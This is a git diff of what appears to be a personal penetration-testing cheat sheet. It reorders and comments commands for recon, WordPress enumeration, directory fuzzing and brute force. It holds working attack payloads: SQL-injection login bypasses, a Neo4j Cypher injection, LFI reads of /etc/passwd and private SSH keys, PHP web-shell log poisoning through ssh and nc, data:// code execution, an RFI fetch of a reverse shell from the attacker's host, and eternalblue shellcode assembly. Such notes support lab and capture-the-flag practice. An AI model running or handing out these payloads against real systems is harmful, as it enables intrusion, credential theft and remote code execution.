@@ -33,29 +33,22 @@ https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 
 ## Recon
 
-### Find name and IP
+### Find name and IP of a machine
 ```sudo  nbtscan 192.168.x.x/24```
+
 ### Scan all ports that are open and services running
 ```
+# Basic nmap scan
 nmap -p- --open -sV -A 192.168.x.x
-# Full scan
+
+# Full nmap scan
 sudo nmap -sV -A -T4 -p- --open 192.168.2.106
 
-IF NMAP IS SLOW
+# IF NMAP IS SLOW
 masscan -e tun0 -p1-65535,U:1-65535 10.10.10.x --rate=500
 ```
-
-### WPscan
-```
-wpscan --url URL --plugins-detection aggressive -e vp
-wpscan --url URL --plugins-detection aggressive -e ap
-
-# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
-wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
-```
-### Script to get all ports in readable format
+### Script to get all ports in readable format in a file
 ``` sudo nmap -p- --open -sV -A -T4 192.168.2.20 | grep "open" | awk '{print $1, $3}' > filtered_results.txt ```
-
 
 
 ## Enumerating
@@ -78,11 +71,19 @@ Lists the processes that are being launched in real time, including processes ow
 
 ### Wordy websites
 ```
+# Scan word press installations for vulnerabilities 
+wpscan --url URL --plugins-detection aggressive -e vp
+wpscan --url URL --plugins-detection aggressive -e ap
+
 Scan for login details
 wpscan --url http://wordy/ --enumerate p --enumerate t --enumerate u
 
 Save all account details in file and run
 wpscan --url //wordy/ -U users -P password
+
+# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
+wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+
 ```
 
 ### smbmap 
@@ -126,7 +127,7 @@ nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <tar
 ### DIRB
 ```
 dirb http://IP/
-Use -X .php OR .txt to filter files
+- Use -X .php OR .txt to filter files
 ```
 ### Mounting
 ```
@@ -149,38 +150,50 @@ hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.2.20:5901
 ```
 ### GoBuster
 ```
+# Basic Scan
 gobuster dir -u http://192.168.2.20 -w /usr/share/wordlists/dirb/big.txt -t 50
-gobuster dir -u http://192.168.56.113/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-Aggressive search: gobuster dir -u http://192.168.x.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1 -z -k -l -x "txt,html,php"
 
-Ignore status errors - if no page is found
+# Faster Scan
+gobuster dir -u http://192.168.56.113/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+
+# Agressive Scan
+gobuster dir -u http://192.168.x.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1 -z -k -l -x "txt,html,php"
+
+# Ignore status errors - if no page is found
 gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k -s 200,204,301,302,307,403,401 -b 302
 gobuster dir -u http://0.0.0.0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -b 301
 ```
-### GET DEFAULT credentials
+### GET DEFAULT credentials using nmap
 ```
 nmap -Pn -n –-script http-default-accounts -p 80 192.168.2.20 –-open -T5 -vv
 ```
-### HTTP Vuln
+### HTTP 
 ```
+# Scan for vulns
 nmap -Pn -n -p80 192.168.2.4 --script http-vuln* --open -T5 -vv
+
+# Inspect HTTP code on login page for exposed functions or methods to authenticate - USE BURPE SUITE
 ```
 ### Fuzzing
+
+If needed
 git clone https://github.com/danielmiessler/SecLists.git
 apt -y install seclists
+
 ```
 ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u http://192.168.56.125:8080/administration.php?FUZZ-helloworld -fs 65
 ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u 192.168.56.125:8080/administration.php?logfile=<name of file>
 
 ffuf -w /path/to/wordlist -u 'https://target'  -H 'Host: FUZZ.TARGET.DOMAIN'
+
 # Find log file for poisoning
 cat /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep log > log.txt 
 ffuf -u http://${IP}/LFI.php?file=FUZZ -w log.txt -fr "Failed opening" -o fuzz.txt
 
-Discover new paths
+# Discover new paths
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html,.php,.txt -u 'http://10.0.2.114:8080/FUZZ' -of html -o dir.html -fs 2899
 
-Discover any sort of file based off current URL
+# Discover any sort of file based off current URL
 ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.114:8080/administration.php?FUZZ=anything' -of html -o admin-get.html -fs 65
 ```
 ### ZIP cracking
@@ -194,18 +207,24 @@ cat dump.sql
 
 ### SSH User Logins and exploits
 ```
+# Use private key to SSH in
 ssh -i ssh_key user@192.168.x.x
-Make sure ssh_key is the private key -> public key can show username though
+- Make sure priv key is formatted correctly in file and has chmod 600 perms
+
+- Public key can show username though
 ```
 
 ### Login Pages
 ```
-Usr: Admin, Pass: Admin
-OR SQL injection
+# Usr: Admin, Pass: Admin
+
+# OR SQL injection
 admin' -- -
-Bypass MD5 hash username:
+
+# Bypass MD5 hash username:
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
-Password bypass
+
+# Password bypass
 ' or 1=1--+
 
 BURPE SUITE INJECTION
@@ -216,78 +235,58 @@ Open login webpage in burpe suite
 - change username and password values to exploits
 ```
 
-### Neo4j exploit 
-Enumerated login page with burpsuite revealed http website is using neo4j to store login details
-- ran login auth in burp suite
-- found note // TODO: don't store user accounts in neo4j
-- Captured POST /api/auth JSON request in Burp { "username": "admin", "password": "test" }
-- Tried Boolean bypass payloads in username and password fields.
-
-CASE:
-```
-'MATCH (u:USER)-[:SECRET]->(h:SHA1) 
-WHERE u.name = '<input>'
-RETURN h.value AS hash'
-```
-- Found db_hash = results[0]["hash"]
-- Payload to inject known SHA1 hash that matched password
-```
-{
-  "username": "' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //",
-  "password": "password"
-}
-```
-- obtain valid session token
-- modify burp request - in repeater change Cookie in header options to the access token above
-- Cookie: access-token=<JWT>
-
 ### Log poisoning
-Desmonds notes
 ```
-#POC LFI, check /etc/passwd
+# POC LFI, check /etc/passwd
 http://IP/?FI=/etc/passwd
-#or
+
+# or
 http://IP/?FI=../../../../../../../../etc/passwd
-#if there is any user has shell login
+
+# if there is any user has shell login
 http://IP/?FI=/home/user/.ssh/id_rsa
+
 # more advanced filter see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
 # RFI, rare since it is not enabled by default
 # Setup a http server contains a reverse shell script
 # send request then it will be invoked
 http://IP/?FI=http://YOUR_IP/YOUR_PAYLOAD
+
 # access log poisoning with ssh
-ssh '<?php system($_GET['cmd']); ?>'@IP 
+ssh '<?php system($_GET['cmd']); ?>'@IP
+
 # access log poisoning with http
 nc -nv IP HTTP_PORT
 <?php system($_GET['cmd']); ?> #<- then click on return key twice and you should see a bad request respond
+
 # SMTP injection
 http://IP/FI?=/var/mail/TARGET_USER&cmd=id
+
 # extension append filter
 # data, can execute code directly
 http://IP/FI?=data://text/plain,<?php phpinfo(); ?>
 http://IP/FI?=data://text/plain,<?php shell_exec("PAYLOAD"); ?>
+
 # data and base64 encode to code execution
 echo -n '<?php echo system($_GET["cmd"]);?>' | base64
 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+
 # base64, can check file source
 http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
-```
+
 IF LFI enabled above will work
 LFI tutorial: 
 https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956
 
 IF NO LFI
-```
 To send packets to the authenticated /logViewPage.php first need to grab the PHPSESSIONID
 Inspect Page and storage tab -> PHPSESSION ID: 3igpv4q3neckiknb40ou3hrt8o
 
 Use ffuf to fuzz the page using these lists -> /usr/share/seclists/Fuzzing/LFI
-
 ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56
 
 the ../../../../ can be run with different deepness for different files up to 10
-
 Type into URL
 http://192.168.56.113/sea.php?file=../../../../var/log/auth
 
@@ -311,12 +310,10 @@ USE AS
 connect with listener on kali
 ```
 
-
-### if stuck on Server port 80 default page try inspect source code
-
 ### cookie inclusion with curl command
 ```
 curl -sv domain/api --cookie "<value>" | jq
+
 ```
 
 
@@ -1107,6 +1104,33 @@ nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
 
+
+### Neo4j exploit 
+```
+Enumerated login page with burpsuite revealed http website is using neo4j to store login details
+- ran login auth in burp suite
+- found note // TODO: don't store user accounts in neo4j
+- Captured POST /api/auth JSON request in Burp { "username": "admin", "password": "test" }
+- Tried Boolean bypass payloads in username and password fields.
+
+CASE:
+```
+'MATCH (u:USER)-[:SECRET]->(h:SHA1) 
+WHERE u.name = '<input>'
+RETURN h.value AS hash'
+```
+- Found db_hash = results[0]["hash"]
+- Payload to inject known SHA1 hash that matched password
+```
+{
+  "username": "' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //",
+  "password": "password"
+}
+```
+- obtain valid session token
+- modify burp request - in repeater change Cookie in header options to the access token above
+- Cookie: access-token=<JWT>
+```
 
 
 
